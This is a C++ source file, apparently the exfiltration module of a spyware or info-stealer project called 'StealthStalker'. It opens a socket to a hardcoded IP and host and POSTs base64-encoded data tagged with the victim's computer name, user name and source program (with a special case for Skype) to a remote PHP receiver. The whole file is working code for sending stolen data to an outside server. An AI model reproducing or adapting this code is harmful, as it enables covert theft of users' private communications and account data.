/*
    Information transmission over the web module;
    Sends information to a defined server

    Author: Kulverstukas
    Date: 2013.03.11
*/

#include <iostream>
#include <winsock2.h>
#include <string>
#include <fstream>
#include "windows.h"
#include "stdio.h"
#include "SendData.hpp"
#include "base64.hpp"

using namespace std;

#define PORT       80
#define IP         "84.32.117.67"
#define HOST       "9v.lt"
#define RECEIVER   "/projects/C/StealthStalker/receive_data.php"
#define COMPNAME   "compname"
#define PROGRAM    "program"
#define FILENAME   "file"
#define BOUNDARY   "----------Evil_B0uNd4Ry_$"

void SendData::transmit(string programName, string computer, string user, string data) {
    // initiate the socket!
    SOCKET dataSock;
    WSADATA wsaData;
    int error = WSAStartup(0x0202, &wsaData);
    if (error != 0) {
        WSACleanup();
        exit(1);  // oh shit, this shouldn't happen!
    }
    // all internets, engage!
    SOCKADDR_IN target;
    target.sin_family = AF_INET;
    target.sin_port = htons(PORT);
    target.sin_addr.s_addr = inet_addr(IP);
    dataSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (dataSock == INVALID_SOCKET) {
        exit(1); // Houston, we have a problem!
    }
    connect(dataSock, (SOCKADDR*)&target, sizeof(target));

    printf("Sending data for %s\n", programName.c_str());
    string body = constructBody(programName, computer, user, base64_encode(reinterpret_cast<const unsigned char*>(data.c_str()), strlen(data.c_str())));
    char header[1024];
    sprintf(header, "POST %s HTTP 1.1\r\n"
                    "Host: %s\r\n"
                    "Content-Length: %d\r\n"
                    "Connection: Keep-Alive\r\n"
                    "Content-Type: multipart/form-data; boundary=%s\r\n"
                    "Accept-Charset: utf-8\r\n\r\n", RECEIVER, HOST, strlen(body.c_str()), BOUNDARY);
//    printf("%s\n\n", header);
    send(dataSock, header, strlen(header), 0);
    send(dataSock, body.c_str(), strlen(body.c_str()), 0);

    // must receive, otherwise apache will ignore our requests or
    // just crash...
    char buff[1024];
    recv(dataSock, buff, 1024, 0);
    printf("%s\n\n", buff);

    closesocket(dataSock);
    WSACleanup();
}

string SendData::constructBody(string programName, string computer, string user, string data) {
    string body;
    string CRLF = "\r\n";

    // first we add the args
    body.append("--"+string(BOUNDARY)+CRLF);
    body.append("Content-Disposition: form-data; name=\""+string(COMPNAME)+"\""+CRLF);
    body.append(CRLF);
    body.append(computer+CRLF);
    body.append("--"+string(BOUNDARY)+CRLF);
    body.append("Content-Disposition: form-data; name=\""+string(PROGRAM)+"\""+CRLF);
    body.append(CRLF);
    body.append(programName+CRLF);

    // now we add the data
    body.append("--"+string(BOUNDARY)+CRLF);
    if (programName == "Skype") {
        body.append("Content-Disposition: form-data; name=\""+string(FILENAME)+"\"; filename=\""+string(user)+".html\""+CRLF);
    } else {
        body.append("Content-Disposition: form-data; name=\""+string(FILENAME)+"\"; filename=\""+string(user)+"\""+CRLF);
    }
    body.append("Content-Type: text/plain"+CRLF);
    body.append(CRLF);
    body.append(data+CRLF);
    body.append("--"+string(BOUNDARY)+"--"+CRLF);
    body.append(CRLF);

//    printf(body.c_str()); exit(0);

    return body;
}
